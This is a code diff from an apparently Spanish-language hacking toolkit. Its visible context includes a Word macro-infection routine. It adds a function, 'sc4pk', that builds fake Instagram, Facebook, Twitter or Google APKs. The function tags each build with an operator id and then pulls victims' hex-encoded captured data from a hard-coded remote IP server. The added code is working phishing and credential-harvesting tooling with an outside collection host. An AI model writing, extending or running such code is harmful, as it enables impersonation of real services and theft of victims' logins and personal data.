@@ -1,6 +1,8 @@
 import os
 import sys
 import time
+import shutil
+import codecs
 import random
 import base64
 import zipfile
@@ -12,6 +14,23 @@ import aspose.words as aw
 from bs4 import BeautifulSoup
 from tabulate import tabulate
 from ftplib import FTP, error_perm, error_reply, error_temp
+
+try:
+    with open(".root", "r") as root_dir:
+        ROOT_MAX = root_dir.readlines()[0]
+
+        if "\\" in ROOT_MAX:
+            ROOT_MAX = ROOT_MAX.replace("\\", "/")
+        
+        if "//" not in f"{ROOT_MAX}/":
+            ROOT_MAX = ROOT_MAX + "/" # Cuando se use ROOT_MAX no hay que usar / porque ya lo tiene incluido
+
+except:
+    if "mgt0ls" in os.getcwd():
+        print("[ERROR 01] setup.py Aun no ah sido ejecutado...")
+    else:
+        print("[ERROR 02] No estas en la carpeta principal de mgt0ls...")
+    exit(0)
 
 def findperson(nombre, arg):
 
@@ -989,4 +1008,139 @@ def wordinfect(ruta, macro):
         else:
             print("[WORD INFECTADO] ===> {}".format(ruta_save))
 
+def sc4pk(idcap, selec):
+
+    CONTADOR=0
+    SYS=platform.system().lower()
+
+    ver_carpeta=os.listdir(".scripts/sc4pk/")
+
+    base_apk={
+
+        "ig":"instagram",
+        "fb":"facebook",
+        "tw":"twitter",
+        "go":"google"
+
+    }
+
+    def crear(selec, idcap):
+
+        REMP=base_apk.get(selec)
+
+        try:
+            
+            asset_save=open(f".scripts/sc4pk/Scam_2/assets/selec.rdp", "w")
+            asset_save.write(REMP)
+            asset_save.close()
+
+            asset_save=open(f".scripts/sc4pk/Scam_2/assets/id.rdp", "w")
+            asset_save.write(idcap)
+            asset_save.close()
+
+            """
+            xml_open=codecs.open(".xml", "r", encoding="utf-8")
+            xml_read=xml_open.read()
+            xml_read=xml_read.replace("ID_MG", idcap).replace("SELEC_MG", REMP)
+            xml_open.close()
+
+            xml_open=open("main.xml", "wb", encoding="utf-8")
+            xml_open.write(xml_read)
+            xml_open.close() # Solucionar error de encode
+            """
+            # Movimiento de archivos
+            #shutil.rmtree("Scam_2/res/layout/main.xml")
+            #shutil.rmtree("Scam_2/res/drawable-xhdpi-v4/app_icon.png")
+
+            shutil.move(f".scripts/sc4pk/Scam_2/res/drawable-xhdpi-v4/{REMP}.png", ".scripts/sc4pk/Scam_2/res/drawable-xhdpi-v4/app_icon.png")
+
+            if "win" in SYS:
+                print(f"[APK] COMPRIME LA APK QUE SE ECNUENTRA EN:\n[PATH] {ROOT_MAX}.scripts/sc4pk/ ->> Scam_2/")
+            else:
+                os.chdir(".scripts/sc4pk/Scam_2/")
+                os.system("zip -r Lite.apk *")
+                print(f"[APK] APK SIN FIRMA CREADA CON EXITO:\n[PATH] {ROOT_MAX}.scripts/sc4pk/Scam_2/ ->> Lite.apk")
+
+            #shutil.move("main.xml", "Scam_2/res/layout/main.xml") 
+
+        except:
+            print("[ERROR] ALGO SUCEDIO X_X")
+            pass
+        
+        else:
+            #print()
+            print("[CHECK] ->> LISTO")
+            exit(0)
+
+    def obtener(idcap):
+
+        global CONTADOR
+
+        try:
+            obtiene=requests.get("http://192.71.249.244:60001/comments")
+        except:
+            print("[ERROR] ALGO SUCEDIO X_X")
+            pass
+        else:
+
+            sopa=BeautifulSoup(obtiene.text, "html.parser")
+
+            obtener=str(sopa.find_all(id="comments"))
+            obtener=obtener.replace("<br/>", "\n")
+
+            temp=open(".temp", "w", encoding="utf-8")
+            temp.write(obtener)
+            temp.close()
+
+            temp=open(".temp", encoding="utf-8")
+            temp_read=temp.readlines()
+
+            chek=False
+
+            for word in temp_read:
+                word=word.replace("\n","")
+
+                if idcap in word:
+                    CONTADOR=CONTADOR+1
+                    #print(word) DEVOLPING COMMENTS
+                    chek=True
+
+                    #print("\n[TARGET]->> SCAM.APK\n")
+                    word=word.replace(idcap,"").replace(" ","").replace("</div>]","")
+                    #print(word)
+                    try:
+                        print(f"[HEX] YOUR HEX CODE TARGET->> [{CONTADOR}]")
+                        word=str(codecs.decode(word,"hex"))
+                        print(word.replace("\\n","\n").replace("b'","[TARGET]->> SCAM.APK ->> ").replace("#'","\n").replace("%40","@").replace("%C3%B1","ñ"))
+                    except:
+                        print("[ERROR] HEX NO ENCONTRADO X_X")
+                        exit(0)
+
+            if chek == False:
+                print("[ID] NO ENCONTRAMOS VICTIMAS RELACIONADAS A TU ID")
+                exit(0)
+
+            temp.close()
+            os.remove(".temp")
+
+    if selec in base_apk:
+
+        try:
+            if "Scam_2" in ver_carpeta:
+                shutil.rmtree(".scripts/sc4pk/Scam_2")
+                shutil.copytree(".scripts/sc4pk/Scam",".scripts/sc4pk/Scam_2")
+            else:
+                shutil.copytree(".scripts/sc4pk/Scam",".scripts/sc4pk/Scam_2")    # Bloque encargado de verificar si hay el apk que se va a crear
+
+        except Exception as err:
+            print(err)
+
+        crear(selec, idcap)
+    
+    else:
+        print("[ERROR] Opcion ingresada no valida...")
+    
+    if selec == None:
+        
+        obtener(idcap)
 #################################
